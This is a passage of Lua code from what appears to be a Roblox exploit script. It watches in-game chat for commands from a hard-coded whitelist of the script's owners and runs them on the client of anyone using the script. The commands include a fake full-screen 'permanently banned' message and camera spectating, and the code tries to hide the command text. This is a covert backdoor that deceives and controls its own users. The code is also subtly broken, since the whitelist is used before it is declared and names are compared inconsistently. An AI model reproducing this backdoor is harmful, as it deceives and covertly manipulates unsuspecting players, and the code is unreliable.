            gui.IgnoreGuiInset = true
            gui.ResetOnSpawn = false

            local textLabel = Instance.new("TextLabel", gui)
            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.Text = "You have been permanently banned."
            textLabel.TextColor3 = Color3.new(1, 0, 0)
            textLabel.TextScaled = true
            textLabel.BackgroundColor3 = Color3.new(0, 0, 0)

            commandStates.fakeBanGui = gui
        end
    end,

    [".unfakeban"] = function()
        if commandStates.fakeBanGui then
            commandStates.fakeBanGui:Destroy()
            commandStates.fakeBanGui = nil
        end
    end,

    [".spectate"] = function(fromPlayer)
        if fromPlayer.Character and fromPlayer.Character:FindFirstChild("Humanoid") then
            local cam = workspace.CurrentCamera
            commandStates.spectateCamera = cam.CameraSubject
            cam.CameraSubject = fromPlayer.Character:FindFirstChild("Humanoid")
        end
    end,

    [".unspectate"] = function()
        if commandStates.spectateCamera then
            workspace.CurrentCamera.CameraSubject = commandStates.spectateCamera
            commandStates.spectateCamera = nil
        end
    end,
}

-- ✅ Checks if a player is whitelisted
local function isWhitelisted(name)
    return WHITELIST[string.lower(name)] == true
end

-- ✅ Attempt to execute command & hide message
local function tryExecuteCommand(fromPlayer, message)
    if not isWhitelisted(fromPlayer.Name) then return end
    local command = message:lower():match("^(%S+)")
    if command and CommandActions[command] then
        CommandActions[command](fromPlayer, message)

        -- Hide the message visually (if modern chat is enabled)
        pcall(function()
            StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "",
                Color = Color3.new(0, 0, 0)
            })
        end)
    end
end

-- ✅ Monitor chat for each player
local function monitorChat(player)
    player.Chatted:Connect(function(message)
        tryExecuteCommand(player, message)
    end)
end

-- ✅ Hook all players
for _, plr in ipairs(Players:GetPlayers()) do
    if plr ~= LocalPlayer then
        monitorChat(plr)
    end
end

Players.PlayerAdded:Connect(function(plr)
    if plr ~= LocalPlayer then
        monitorChat(plr)
    end
end)



--// Whitelist Configuration
local WHITELIST = {
    ["RedExeTheWarrior"] = true,          -- Replace/add usernames here
    ["RXScripter"] = true,
    ["nope"] = true,
}

--// Function to run if whitelisted
local function ShowTabOwner()
	local admin = RXFwindow:AddTab("rx") -- Name of tab
admin:Show()
	admin:AddLabel("Owner Tab")
admin:AddLabel("• This tab is exclusive to\n the script owner.")
admin:AddButton("Show Commands",function()
	-- Code here
end)
end

--// Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

--// Silent Whitelist Check
if WHITELIST[LocalPlayer.Name] then
    ShowTabOwner()
end